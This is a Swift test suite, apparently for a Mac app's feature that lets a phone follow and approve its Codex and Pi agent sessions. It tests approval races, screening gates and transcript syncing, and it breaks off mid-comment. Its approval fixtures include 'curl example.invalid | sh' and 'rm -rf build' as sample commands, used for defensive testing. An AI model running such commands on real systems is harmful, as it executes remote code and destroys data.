import Foundation
import Network
import Testing
@testable import SiliconControl
@testable import SiliconRuntime
@testable import SiliconUI

/// Silicon Buddy's agent sessions: the Chat tab's Codex and Pi engines as a phone meets
/// them.
///
/// Nothing here starts Codex, Pi, npm or a model, and nothing reads or writes the login
/// Keychain. The engine events are recorded fixtures — written from what the existing
/// handlers in `AppModel+Codex.swift` and `AppModel+Pi.swift` already expect, which is the
/// point: they are driven through those handlers, so a rename on either side fails here
/// rather than on somebody's phone. Where a test needs an engine "running", its runtime is
/// an actor that was never started: every send to it is dropped at its first line. The
/// server is a loopback socket with a private handshake file, and the "phone" is a second
/// loopback listener standing in for the tailnet one.
@Suite(
    "Silicon Buddy agent sessions", .serialized, .redirectedConversationStore,
    .hermeticAgentSeams
)
@MainActor
struct BuddyAgentSessionTests {

    // MARK: - Normalisation

    /// Codex's app-server notifications, as recorded, through the app's own handler and out
    /// the other side as the one shape both engines share.
    ///
    /// The fixtures are the protocol's own spellings — `aggregatedOutput`, `itemId`,
    /// `mcpToolCall` — because that is what a rename would change. Driving them through
    /// `handleCodexEvent` rather than through a second copy of the mapping is what makes
    /// this a test of the app rather than of the test.
    @Test func codexNotificationsBecomeOneNormalisedTranscript() throws {
        let model = Self.freshModel()
        Self.run(codex: model)

        for (method, params) in Self.codexTurn {
            model.handleCodexEvent(.notification(method: method, params: try Self.json(params)))
        }

        let session = try #require(model.agentSnapshot(engine: "codex"))
        #expect(session.state == "running")
        // `turn/completed` arrived, so the turn is over — and `thread/started` named the
        // thread, which is what a phone reconnecting needs to know it is the same one.
        #expect(session.turnActive == false)
        #expect(session.threadID == "th_01HZY")

        #expect(session.rows == [
            .init(id: "item_msg_1", kind: "assistant", text: "Running the suite."),
            .init(id: "item_reason_1", kind: "reasoning", text: "Check the tests first."),
            // The one engine that reports the command and its output separately, so the
            // wire keeps them separate too.
            .init(
                id: "item_cmd_1", kind: "command", text: "swift test --filter Lisbon",
                output: "1 test failed: itineraryFitsInThreeDays\n", status: "completed"
            ),
            .init(
                id: "item_patch_1", kind: "fileChange",
                text: "Sources/Lisbon/Itinerary.swift"
            ),
            // Three Codex item types collapse into `tool`; a phone learns one word.
            .init(
                id: "item_tool_1", kind: "tool",
                text: "silicon-optimizer · generate_image", status: "completed"
            ),
            .init(id: "item_web_1", kind: "tool", text: "web search: lisbon tram 28"),
            .init(
                id: "item_err_1", kind: "error",
                text: "The model stopped mid-turn.", status: "failed"
            ),
        ])
    }

    /// The same thing from the other engine, whose events look nothing alike on the wire
    /// and have to look identical afterwards.
    @Test func piEventsBecomeTheSameShape() throws {
        let model = Self.freshModel()
        model.piState = .ready

        for event in Self.piTurn {
            model.handlePiEvent(try Self.object(event))
        }

        let session = try #require(model.agentSnapshot(engine: "pi"))
        #expect(session.state == "running")
        #expect(session.turnActive == false)
        // Pi's RPC hands a client no thread id, and the contract says null rather than
        // inventing one out of the session file's name.
        #expect(session.threadID == nil)

        let rows = session.rows
        #expect(rows.map(\.kind) == ["reasoning", "assistant", "tool"])
        #expect(rows[0].text == "Check the tests first.")
        // `message_end` replaces the streamed assembly with the authoritative text.
        #expect(rows[1].text == "Running the suite.")
        // Pi overwrites a tool row's text with its result, so `text` is the tool and
        // `output` is whichever of the two Pi currently holds.
        #expect(rows[2].text == "bash")
        #expect(rows[2].output == "1 test failed: itineraryFitsInThreeDays")
        #expect(rows[2].status == "completed")
        // `agent_end` settles everything that was running; nothing is left claiming to be
        // in flight after the turn is over.
        #expect(rows.allSatisfy { $0.status != "running" })
    }

    /// A log is sampled ten times a second, so what travels is its tail — and it says so.
    @Test func aLongOutputTravelsAsItsTailAndSaysSo() throws {
        let limit = ControlAPI.agentOutputLimit
        let log = String(repeating: "compiling…\n", count: limit) + "error: the last line"
        let row = AppModel.agentRow(codex: CodexChatItem(
            id: "c1", kind: .command(command: "swift build", output: log, running: false)
        ))
        #expect(row.truncated == true)
        #expect(row.output?.count == limit)
        // The end, which is where a build says what went wrong.
        #expect(row.output?.hasSuffix("error: the last line") == true)

        // Exactly at the limit nothing is cut, and nothing claims to have been.
        let exact = String(repeating: "x", count: limit)
        let whole = AppModel.agentRow(codex: CodexChatItem(
            id: "c2", kind: .command(command: "ls", output: exact, running: false)
        ))
        #expect(whole.truncated == nil)
        #expect(whole.output == exact)
        // Multi-byte text is cut by characters, not bytes: never half a character.
        let wide = String(repeating: "é", count: limit + 10)
        let cut = AppModel.agentRow(codex: CodexChatItem(
            id: "c3", kind: .command(command: "cat", output: wide, running: false)
        ))
        #expect(cut.output?.count == limit)
        #expect(cut.truncated == true)
    }

    // MARK: - Approvals, and the screening window

    /// Both engines' approvals, side by side on the wire — each one carrying what the Mac's
    /// own card says about it.
    ///
    /// Screenings are injected rather than run: a real one asks `JevService.shared`, and a
    /// unit test must not depend on whether the person running it has TypeSafe switched
    /// on. What is under test is the mapping and the gate, which is the part Silicon Buddy
    /// owns.
    @Test func approvalsFromBothEnginesLookAlikeOnTheWire() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.piState = .ready

        model.codexApprovals = [
            CodexApproval(
                rpcID: .number(7), kind: .command("rm -rf build"),
                reason: "Codex asks before running a command in this folder.",
                screening: Self.unscreened
            ),
            // A screening that failed on the network: its reason is an error's description,
            // and it does not travel.
            CodexApproval(
                rpcID: .number(8), kind: .fileChange("Sources/Lisbon/Itinerary.swift"),
                screening: .unavailable(reason: "Could not connect to api.example.invalid")
            ),
        ]
        model.piItems = [Self.screenedPiCard(#"{"command":"swift test"}"#)]

        let codex = try await model.agentSession(engine: "codex", query: .init())
        #expect(codex.approvals.map(\.kind) == ["command", "fileChange"])
        #expect(codex.approvals[0].summary == "rm -rf build")
        #expect(codex.approvals[0].reason?.isEmpty == false)
        #expect(codex.approvals[0].screening == ControlAPI.AgentScreening(
            verdict: "unavailable",
            summary: "Jev: not screened — Guardrails are off in Settings → TypeSafe (Jev)."
        ))
        #expect(codex.approvals[1].screening.verdict == "unavailable")
        #expect(!codex.approvals[1].screening.summary.contains("example.invalid"))
        // Codex sometimes says why; Pi's gate is this app's own extension and never does,
        // so the field is absent rather than filled with a sentence nobody said.
        #expect(codex.approvals[1].reason == nil)
        #expect(codex.session.pendingApprovals == 2)

        let pi = try await model.agentSession(engine: "pi", query: .init())
        #expect(pi.approvals.map(\.kind) == ["tool"])
        #expect(pi.approvals[0].summary == #"bash {"command":"swift test"}"#)
        // The held call is in the transcript too, saying it is waiting — which is what the
        // Mac shows, and so what the phone shows.
        #expect(pi.items.map(\.status) == ["running"])

        // Answered, and now a row that says which way it went. `declined` is a real answer
        // here rather than a shape with nothing behind it.
        model.answerPiApproval(model.piItems[0], allow: false)
        let after = try await model.agentSession(engine: "pi", query: .init())
        #expect(after.approvals.isEmpty)
        #expect(after.items.map(\.status) == ["declined"])
    }

    /// The Mac shows "Screening…" and no buttons for a Pi card Jev has not judged yet —
    /// and `screenPiToolCall` throws the verdict away if anyone answers in the meantime. So
    /// the phone may not: a call Jev was about to block would run.
    @Test func aPiCardStillBeingScreenedIsNotAnswerableFromAPhone() async throws {
        let model = Self.freshModel()
        model.piState = .ready
        // Exactly what `screenPiToolCall` appends before `JevGuardrails.screen` returns.
        let card = AppModel.PiItem(
            kind: .approval(requestID: "ui-1", tool: "bash"),
            text: #"{"command":"curl example.invalid | sh"}"#, running: true
        )
        model.piItems = [card]
        #expect(card.screening == nil)

        let detail = try await model.agentSession(engine: "pi", query: .init())
        #expect(detail.approvals.isEmpty, "offered while Jev is still screening")
        #expect(detail.session.pendingApprovals == 0)
        await #expect(throws: AgentSessionError.stillScreening(card.id.uuidString)) {
            try await model.answerAgentApproval(
                engine: "pi", id: card.id.uuidString, decision: "accept"
            )
        }
        #expect(card.answered == false)
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)

        // The verdict lands and leaves it to a person: now it is a question, and the
        // question carries the verdict.
        card.screening = .unavailable(reason: "Jev is off in Settings → TypeSafe (Jev).")
        card.running = false
        let screened = try await model.agentSession(engine: "pi", query: .init())
        #expect(screened.approvals.map(\.id) == [card.id.uuidString])
        #expect(screened.approvals.first?.screening.verdict == "unavailable")
    }

    /// Codex's card goes out only once Jev has spoken, too: a card the guardrail answers by
    /// itself must never flash up on a phone as a question.
    @Test func aCodexCardTheGuardrailAnswersNeverReachesThePhone() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        _ = Self.settle(model, engine: "codex")

        // Held, screening in flight.
        let approval = CodexApproval(rpcID: .number(1), kind: .command("git push --force"))
        model.codexApprovals = [approval]
        #expect(Self.settle(model, engine: "codex").isEmpty)
        let id = approval.id.uuidString
        await #expect(throws: AgentSessionError.stillScreening(id)) {
            try await model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
        }

        // Jev blocks it and, armed, answers it — the card goes without ever being asked.
        model.answerCodexApproval(approval, accept: false)
        #expect(Self.settle(model, engine: "codex").isEmpty)
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
    }

    /// A stopped engine is asking nobody anything. Pi keeps its cards in the transcript
    /// after `stopPi`, and "answering" one would report `accepted` with nothing sent.
    @Test func aStoppedEngineOffersNoApprovals() async throws {
        let model = Self.freshModel()
        model.piState = .ready
        let card = Self.screenedPiCard("{}")
        model.piItems = [card]
        #expect(try await model.agentSession(engine: "pi", query: .init()).approvals.count == 1)

        model.stopPi()
        let pi = try #require(await model.agentSessions().sessions.first { $0.engine == "pi" })
        #expect(pi.state == "stopped")
        #expect(pi.pendingApprovals == 0, "stopped engine reports \(pi.pendingApprovals) pending")
        await #expect(throws: AgentSessionError.notRunning("pi")) {
            try await model.answerAgentApproval(
                engine: "pi", id: card.id.uuidString, decision: "accept"
            )
        }
        #expect(card.answered == false)
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
    }

    // MARK: - The race

    /// The one that matters: the owner answers an approval at the Mac, the phone's tap is
    /// already in flight, and the runtime must be told exactly once.
    ///
    /// `forwardedAnswers` counts every time a device's answer is forwarded to a runtime —
    /// `CodexRuntime.respond`, or Pi's `extension_ui_response` — at the moment it is, and
    /// `answerAgentApproval` is the only path a device has to either. A change that let
    /// the second answer through moves that number, and this fails.
    @Test func anApprovalAnsweredAtTheMacIsNeverForwardedTwice() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        let approval = CodexApproval(
            rpcID: .number(7), kind: .command("rm -rf build"), screening: Self.unscreened
        )
        model.codexApprovals = [approval]

        // The phone has seen the card and is about to answer it.
        let waiting = try await model.agentSession(engine: "codex", query: .init())
        #expect(waiting.approvals.map(\.id) == [approval.id.uuidString])

        // The owner gets there first.
        model.answerCodexApproval(approval, accept: true)
        #expect(model.codexApprovals.isEmpty)

        await #expect(throws: AgentSessionError.answeredOnTheMac(approval.id.uuidString)) {
            try await model.answerAgentApproval(
                engine: "codex", id: approval.id.uuidString, decision: "decline"
            )
        }
        // Nothing was sent. Not "sent and ignored" — not sent.
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
    }

    /// The other way round, and the second tap after it.
    @Test func aPhonesAnswerIsForwardedOnceAndThenTheCardIsGone() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        let approval = CodexApproval(
            rpcID: .number(7), kind: .command("swift test"), screening: Self.unscreened
        )
        model.codexApprovals = [approval]
        let id = approval.id.uuidString

        let answered = try await model.answerAgentApproval(
            engine: "codex", id: id, decision: "accept"
        )
        #expect(answered.decision == "accepted")
        #expect(answered.session.pendingApprovals == 0)
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
        // The card goes at once, on the Mac as well: a decision has been made, and a card
        // still on screen would be a lie about what is still pending.
        #expect(model.codexApprovals.isEmpty)

        // A second tap — a retry on a bad connection, a stale screen. Not 409: the Mac did
        // not answer this, the last request did, and nothing else was decided here.
        await #expect(throws: AgentSessionError.unknownApproval(id)) {
            try await model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
        }
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)

        // A decision that is not one never reaches the approval at all.
        await #expect(throws: AgentSessionError.unknownDecision("maybe")) {
            try await model.answerAgentApproval(engine: "codex", id: id, decision: "maybe")
        }
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
    }

    /// Two full-control phones tap at once: one forward, and one refusal.
    @Test func twoPhonesAtOnceForwardOnce() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        let approval = CodexApproval(
            rpcID: .number(3), kind: .command("ls"), screening: Self.unscreened
        )
        model.codexApprovals = [approval]
        let id = approval.id.uuidString
        async let one = try? model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
        async let two = try? model.answerAgentApproval(engine: "codex", id: id, decision: "decline")
        let results = await [one, two]
        #expect(results.compactMap { $0 }.count == 1)
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
    }

    /// A card that goes away without anybody answering it — a stopped engine, a restart, a
    /// sidecar that died. Nothing will run, so the phone's card comes down saying
    /// `declined`; but nobody answered first, so a tap that lands afterwards is a 404 and
    /// not a 409 about a decision that was never made.
    @Test func anApprovalTheEngineTookWithItIsGoneRatherThanAnswered() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        let approval = CodexApproval(
            rpcID: .number(9), kind: .command("swift build"), screening: Self.unscreened
        )
        _ = Self.settle(model, engine: "codex")
        model.codexApprovals = [approval]
        let id = approval.id.uuidString
        _ = Self.settle(model, engine: "codex")

        // What `handleCodexEvent(.terminated)` does when the sidecar exits under a turn.
        model.codexApprovals.removeAll()
        #expect(Self.states(Self.settle(model, engine: "codex")) == ["declined"])

        await #expect(throws: AgentSessionError.unknownApproval(id)) {
            try await model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
        }
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
    }

    /// Pi's half of the same rule. Its cards stay in the transcript once answered, so the
    /// race is detected differently and has to come out the same.
    @Test func piApprovalsFollowTheSameRule() async throws {
        let model = Self.freshModel()
        model.piState = .ready
        let card = Self.screenedPiCard(#"{"command":"rm -rf build"}"#)
        model.piItems = [card]
        let id = card.id.uuidString

        _ = try await model.agentSession(engine: "pi", query: .init())
        model.answerPiApproval(card, allow: false)

        await #expect(throws: AgentSessionError.answeredOnTheMac(id)) {
            try await model.answerAgentApproval(engine: "pi", id: id, decision: "accept")
        }
        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
    }

    // MARK: - Catching up

    /// A phone that lost its stream asks for what it missed with the cursor it has, and
    /// gets that and nothing else.
    @Test func sinceHandsBackOnlyWhatAPhoneHasNotSeen() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant("First."))]

        let first = try await model.agentSession(engine: "codex", query: .init())
        #expect(first.items.map(\.id) == ["a1"])
        #expect(first.complete)
        #expect(first.epoch == first.session.epoch)

        model.codexItems.append(CodexChatItem(id: "a2", kind: .assistant("Second.")))
        let caught = try await model.agentSession(
            engine: "codex", query: .init(since: first.seq, epoch: first.epoch)
        )
        #expect(caught.items.map(\.id) == ["a2"])
        #expect(caught.complete == false)
        #expect(caught.seq > first.seq)

        // A row that changes is newer again — text that grew while the phone was away is
        // not "already seen" because its id is.
        model.codexItems[0].kind = .assistant("First, revised.")
        let revised = try await model.agentSession(
            engine: "codex", query: .init(since: caught.seq, epoch: caught.epoch)
        )
        #expect(revised.items.map(\.id) == ["a1"])
        #expect(revised.items.first?.text == "First, revised.")

        // Nothing moved since: an empty slice, not the transcript again.
        let quiet = try await model.agentSession(
            engine: "codex", query: .init(since: revised.seq, epoch: revised.epoch)
        )
        #expect(quiet.items.isEmpty)
        #expect(quiet.complete == false)

        // A cursor with half missing, from nowhere this session has been, or from another
        // transcript: each is a caller asking to continue from somewhere that does not
        // exist, and the honest answer is the whole transcript, said so by `complete`.
        for query in [
            ControlAPI.AgentSessionQuery(since: revised.seq),
            ControlAPI.AgentSessionQuery(since: 99_999, epoch: revised.epoch),
            ControlAPI.AgentSessionQuery(since: -4, epoch: revised.epoch),
            ControlAPI.AgentSessionQuery(since: revised.seq, epoch: "some-other-epoch"),
        ] {
            let whole = try await model.agentSession(engine: "codex", query: query)
            #expect(whole.items.map(\.id) == ["a1", "a2"], "\(query)")
            #expect(whole.complete, "\(query)")
        }

        // And a new thread is the same situation: what came before cannot be caught up,
        // only replaced — and the epoch says it is a different transcript.
        let beforeTheNewThread = try await model.agentSession(engine: "codex", query: .init())
        model.newCodexThread()
        model.codexItems = [CodexChatItem(id: "b1", kind: .assistant("Fresh."))]
        let afterwards = try await model.agentSession(
            engine: "codex",
            query: .init(since: beforeTheNewThread.seq, epoch: beforeTheNewThread.epoch)
        )
        #expect(afterwards.items.map(\.id) == ["b1"])
        #expect(afterwards.complete)
        #expect(afterwards.epoch != beforeTheNewThread.epoch)
    }

    /// seq restarts with the ledger. A cursor from before the Mac's app relaunched must not
    /// be accepted as a slice of a different transcript.
    @Test func aCursorFromAPreviousRunIsNotAcceptedAsASlice() async throws {
        let before = Self.freshModel()
        Self.run(codex: before)
        before.codexItems = (1...3).map { CodexChatItem(id: "a\($0)", kind: .assistant("a\($0)")) }
        let old = try await before.agentSession(engine: "codex", query: .init())

        let after = Self.freshModel()
        Self.run(codex: after)
        after.codexItems = (1...6).map { CodexChatItem(id: "b\($0)", kind: .assistant("b\($0)")) }
        let resumed = try await after.agentSession(
            engine: "codex", query: .init(since: old.seq, epoch: old.epoch)
        )
        #expect(resumed.complete, "stale cursor answered as slice \(resumed.items.map(\.id))")
        #expect(resumed.items.count == 6)
    }

    /// Frames go out in seq order, so a phone resuming from the last frame it read has read
    /// everything below it. Rows carry the seq they were given when first seen to change,
    /// which can be earlier than a frame made now — so this is not automatic.
    @Test func resumingFromTheLastFrameSeenLosesNothing() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexItems = [
            CodexChatItem(id: "A", kind: .assistant("a0")),
            CodexChatItem(id: "B", kind: .assistant("b0")),
        ]
        _ = Self.settle(model, engine: "codex")
        _ = Self.settle(model, engine: "codex")
        // B grows; some phone's GET reconciles in between the watcher's readings.
        model.codexItems[1].kind = .assistant("b1")
        BuddyAgentSessions.shared.reconcile(try #require(model.agentSnapshot(engine: "codex")))
        // A grows; the watcher reads.
        model.codexItems[0].kind = .assistant("a1")
        let tick = Self.events(Self.settle(model, engine: "codex"))
        let seqs = tick.map(\.seq)
        #expect(seqs == seqs.sorted(), "out of order: \(tick.map { "\($0.item?.id ?? $0.kind)@\($0.seq)" })")
        #expect(tick.compactMap { $0.item?.id } == ["B", "A"])
        // The link drops after the first frame; the phone resumes from it.
        let first = try #require(tick.first)
        let resumed = try await model.agentSession(
            engine: "codex", query: .init(since: first.seq, epoch: first.epoch)
        )
        for id in tick.dropFirst().compactMap({ $0.item?.id }) {
            #expect(resumed.items.contains { $0.id == id }, "row \(id) lost on resume")
        }
    }

    /// A watching phone has to learn that the rows it holds belong to a thread that is
    /// gone — and which one replaced it.
    @Test func aNewThreadIsSignalledOnEvents() throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexThreadID = "th_1"
        model.codexItems = [
            CodexChatItem(id: "a1", kind: .assistant("old 1")),
            CodexChatItem(id: "a2", kind: .assistant("old 2")),
        ]
        _ = Self.settle(model, engine: "codex")
        _ = Self.settle(model, engine: "codex")
        let oldEpoch = try #require(BuddyAgentSessions.shared.epoch(of: model, engine: "codex"))

        model.newCodexThread()
        model.codexItems = [CodexChatItem(id: "b1", kind: .assistant("new"))]
        let tick = Self.events(Self.settle(model, engine: "codex"))
        #expect(tick.map(\.kind) == ["reset", "item"])
        let reset = try #require(tick.first)
        #expect(reset.epoch != oldEpoch)
        #expect(reset.threadID == nil)
        #expect(reset.state == "running")
        #expect(reset.turnActive == false)
        // Every frame after it is in the new transcript.
        #expect(tick.allSatisfy { $0.epoch == reset.epoch })
        #expect(tick.map(\.seq) == tick.map(\.seq).sorted())

        // A thread getting its id is not a new transcript; it is news about this one.
        model.codexThreadID = "th_2"
        let named = Self.events(Self.settle(model, engine: "codex"))
        #expect(named.map(\.kind) == ["state"])
        #expect(named.first?.threadID == "th_2")
        #expect(named.first?.epoch == reset.epoch)
    }

    /// `limit`, and what a slice that would not fit becomes.
    @Test func aLimitNeverDropsTheOldestChangesOfASlice() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexItems = (1...10).map { CodexChatItem(id: "r\($0)", kind: .assistant("\($0)")) }
        let whole = try await model.agentSession(engine: "codex", query: .init(limit: 4))
        // The newest rows, oldest first, and a count of what was left out.
        #expect(whole.items.map(\.id) == ["r7", "r8", "r9", "r10"])
        #expect(whole.omitted == 6)
        #expect(whole.complete)

        // Six rows change: more than the limit. A slice of the newest four would silently
        // leave r1 and r2 stale on the phone — so the answer is the transcript's tail,
        // said to be one.
        for index in 0..<6 { model.codexItems[index].kind = .assistant("changed \(index)") }
        let slice = try await model.agentSession(
            engine: "codex", query: .init(since: whole.seq, epoch: whole.epoch, limit: 4)
        )
        #expect(slice.complete)
        #expect(slice.items.map(\.id) == ["r7", "r8", "r9", "r10"])
        #expect(slice.omitted == 6)

        // One that fits is a slice.
        model.codexItems[9].kind = .assistant("once more")
        let small = try await model.agentSession(
            engine: "codex", query: .init(since: slice.seq, epoch: slice.epoch, limit: 4)
        )
        #expect(small.complete == false)
        #expect(small.items.map(\.id) == ["r10"])
        #expect(small.omitted == 0)

        // A limit out of range is clamped rather than refused.
        let clamped = try await model.agentSession(engine: "codex", query: .init(limit: 0))
        #expect(clamped.items.count == 1)
    }

    // MARK: - Frames

    /// A model writing a hundred tokens a second must not become a hundred frames a second.
    ///
    /// The rule is the sampling, so this is what it looks like: the ledger is reconciled as
    /// often as anything asks — routes do, constantly — and the watcher emits one frame per
    /// row per reading. Twenty deltas between two readings are one frame carrying the row
    /// whole, which is also why a phone that misses one has missed nothing.
    @Test func streamedProseIsCoalescedIntoOneFramePerReading() throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant(""))]

        // The watcher's first reading is its baseline, and says nothing to anybody: a
        // phone that connects is opened from that same reading instead.
        #expect(Self.settle(model, engine: "codex").isEmpty)

        var text = ""
        for token in ["Start ", "in ", "Alfama, ", "early."] {
            text += token
            model.codexItems[0].kind = .assistant(text)
            // Every route that touches this engine reconciles; none of them posts.
            BuddyAgentSessions.shared.reconcile(
                try #require(model.agentSnapshot(engine: "codex"))
            )
        }

        let frames = Self.events(Self.settle(model, engine: "codex"))
        #expect(frames.map(\.kind) == ["item"])
        // The row whole, not the last delta.
        #expect(frames.first?.item?.text == "Start in Alfama, early.")
        #expect(frames.first?.item?.id == "a1")
        // And the sampling rate is the promise: ten readings a second, per engine.
        #expect(AgentEventPump.interval == .milliseconds(100))

        // Nothing moved: nothing said.
        #expect(Self.settle(model, engine: "codex").isEmpty)
    }

    /// What a phone that has just connected is told, per engine: where the session is, and
    /// every card waiting — all at the current seq, so what follows is newer.
    @Test func aConnectingPhoneIsOpenedWithTheSessionAsItIsNow() throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexThreadID = "th_9"
        model.codexTurnActive = true
        model.codexApprovals = [CodexApproval(
            rpcID: .number(2), kind: .command("make"), screening: Self.unscreened
        )]
        let snapshot = try #require(model.agentSnapshot(engine: "codex"))
        BuddyAgentSessions.shared.reconcile(snapshot)
        let opening = Self.events(BuddyAgentSessions.shared.openingFrames(for: snapshot))
        #expect(opening.map(\.kind) == ["state", "turn", "approval"])
        #expect(opening.map(\.state) == ["running", nil, "pending"])
        #expect(opening[1].turnActive == true)
        #expect(Set(opening.map(\.seq)).count == 1)
        #expect(opening.allSatisfy { $0.threadID == "th_9" && !$0.epoch.isEmpty })
    }

    /// The Mac's own doing, on the phone: the owner's send, the owner's approval, the
    /// turn starting and ending.
    @Test func whatTheOwnerDoesAtTheMacBecomesFramesToo() throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        _ = Self.settle(model, engine: "codex")

        // The owner types into the Mac's own window.
        model.codexItems.append(CodexChatItem(id: "u1", kind: .user("Fix the test.")))
        model.codexTurnActive = true
        let typed = Self.settle(model, engine: "codex")
        #expect(Self.kinds(typed) == ["item", "turn"])

        // Codex asks, Jev leaves it to a person, and the card appears on both screens.
        let approval = CodexApproval(
            rpcID: .number(7), kind: .command("swift test"), screening: Self.unscreened
        )
        model.codexApprovals = [approval]
        let asked = Self.settle(model, engine: "codex")
        #expect(Self.kinds(asked) == ["approval"])
        #expect(Self.states(asked) == ["pending"])

        // The owner answers it at the Mac. The phone's card has to go away by itself, and
        // say which way it went — that frame is the whole of "answered on either side
        // resolves on both".
        model.answerCodexApproval(approval, accept: true)
        let answered = Self.settle(model, engine: "codex")
        #expect(Self.kinds(answered) == ["approval"])
        #expect(Self.states(answered) == ["accepted"])

        // A declined one says so too, rather than both ending as "gone".
        let second = CodexApproval(
            rpcID: .number(8), kind: .command("rm -rf build"), screening: Self.unscreened
        )
        model.codexApprovals = [second]
        _ = Self.settle(model, engine: "codex")
        model.answerCodexApproval(second, accept: false)
        #expect(Self.states(Self.settle(model, engine: "codex")) == ["declined"])

        // And the engine going down is one frame, not a silence a phone has to time out on.
        model.codexTurnActive = false
        model.codexState = .failed(message: "Codex exited unexpectedly.")
        let died = Self.settle(model, engine: "codex")
        #expect(Self.kinds(died) == ["state", "turn"])
        #expect(Self.states(died) == ["failed"])
    }

    // MARK: - Sending

    /// The valid-model path, all the way into the engine — with the save and the model list
    /// stubbed, so nothing reads this Mac's disk or writes its Keychain.
    @Test func aTurnSentWithAPickedModelIsSentWithItAndTheChoiceSticks() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexRuntime = CodexRuntime()   // never started: its sends go nowhere
        let saves = SaveRecorder()

        let accepted = try await AgentSessionSeams.$modelChoices.withValue(Self.twoModels) {
            try await AgentSessionSeams.$saveSettings.withValue(saves.record) {
                try await model.sendAgentMessage(
                    engine: "codex", .init(text: "Fix the test.", model: "node/studio/qwen3.8-27b")
                )
            }
        }
        #expect(model.codexItems.first?.id == accepted.itemID)
        // Sticky, as the Mac's own menu is: the engine's model now, and written down —
        // through the seam, never through `Settings.save()`.
        #expect(model.settings.codexModel == "node/studio/qwen3.8-27b")
        #expect(saves.count >= 1)
        #expect(saves.lastCodexModel == "node/studio/qwen3.8-27b")
        // And stamped on the row the phone's send became.
        let detail = try await model.agentSession(engine: "codex", query: .init())
        #expect(detail.items.first { $0.id == accepted.itemID }?.model == "node/studio/qwen3.8-27b")
    }

    /// The Mac's send button is disabled while Codex works; a phone is refused the same.
    /// Pi takes a message mid-turn as steering, which is what typing into it does too.
    @Test func aCodexTurnInProgressRefusesASecondTurnButPiSteers() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexRuntime = CodexRuntime()
        model.codexTurnActive = true

        await #expect(throws: AgentSessionError.turnInProgress("codex")) {
            try await model.sendAgentMessage(engine: "codex", .init(text: "And another thing"))
        }
        #expect(model.codexItems.isEmpty)
        // The first turn's "working" state is untouched.
        #expect(model.codexTurnActive)

        model.piState = .ready
        model.piRuntime = PiRuntime()          // never started: its sends go nowhere
        model.piBusy = true
        let steered = try await model.sendAgentMessage(engine: "pi", .init(text: "Also this"))
        #expect(model.piItems.last?.id.uuidString == steered.itemID)
    }

    /// A model that is not on the list is refused before the engine is asked, rather than
    /// a turn quietly answered by a different model than the one on screen.
    @Test func aTurnCannotBeSentWithAModelThisSessionDoesNotHave() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)

        await #expect(throws: AgentSessionError.unknownModel("gpt-5")) {
            try await model.sendAgentMessage(
                engine: "codex", .init(text: "Hello", model: "gpt-5")
            )
        }
        await #expect(throws: AgentSessionError.emptyMessage) {
            try await model.sendAgentMessage(engine: "codex", .init(text: "   \n "))
        }
        // Nothing reached the transcript on either refusal.
        #expect(model.codexItems.isEmpty)

        // The same rule on Pi, whose model switch would otherwise write settings.
        model.piState = .ready
        await #expect(throws: AgentSessionError.unknownModel("evil/model")) {
            try await model.sendAgentMessage(engine: "pi", .init(text: "hi", model: "evil/model"))
        }

        // And a stopped engine is a 409 that says how to start it, not a silent nothing.
        model.codexState = .idle
        await #expect(throws: AgentSessionError.notRunning("codex")) {
            try await model.sendAgentMessage(engine: "codex", .init(text: "Hello"))
        }
        await #expect(throws: AgentSessionError.unknownEngine("claude")) {
            try await model.sendAgentMessage(engine: "claude", .init(text: "Hello"))
        }
    }

    /// An engine that says it is running but whose sidecar has gone underneath it drops the
    /// message. Handing back the id of the row that happened to be last would tell a phone
    /// its turn was accepted and point it at somebody else's row.
    @Test func aSendThatReachedNothingIsRefusedRatherThanGivenSomebodyElsesRow() async throws {
        let model = Self.freshModel()
        // Ready, and no runtime behind it: `sendPiMessage` has nothing to send to.
        model.piState = .ready
        model.piItems = [AppModel.PiItem(kind: .assistant, text: "Earlier.")]

        await #expect(throws: AgentSessionError.notRunning("pi")) {
            try await model.sendAgentMessage(engine: "pi", .init(text: "Hello"))
        }
        #expect(model.piItems.count == 1)
    }

    // MARK: - Starting, stopping, new threads

    /// The folder is the owner's to pick. A device that could name one could name any
    /// folder on this Mac — and Codex is trusted inside whatever it is given.
    @Test func aPhoneMayDriveCodexButNotChooseWhereItRuns() async throws {
        let model = Self.freshModel()
        #expect(model.hasExplicitCodexWorkingDirectory == false)

        await #expect(throws: AgentSessionError.noWorkingDirectory) {
            try await model.startAgentSession(engine: "codex")
        }
        // Nothing was started, and the reason says where to go rather than what to send.
        #expect(model.codexState == .idle)
        #expect(AgentSessionError.workingDirectoryIsTheMacsToPick.contains("on the Mac"))

        // The session is still listed while it is stopped — a phone that cannot see it
